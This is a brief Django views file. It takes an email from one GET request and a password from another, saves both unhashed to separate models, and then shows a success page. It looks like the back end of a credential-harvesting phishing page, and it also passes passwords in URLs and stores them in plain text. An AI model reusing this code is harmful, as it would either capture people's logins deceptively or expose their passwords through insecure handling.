from django.shortcuts import render
from userData.models import UserEmail,UserPswd


def home(request):
     
    return render(request,'index.html')

def password(request):
    data={}
    if request.method=='GET':
        email=request.GET.get('em')
        print(email)
        new=email
        Mail=UserEmail(email=email)
        Mail.save()
        data={
            'new':new
        }
    return render(request,'contact.html',data)

def Email(request):
    if request.method=='GET':
        pswd=request.GET.get('pwsd')
        pwd=UserPswd(pswd=pswd)
        pwd.save()
    return render(request,'success.html')
        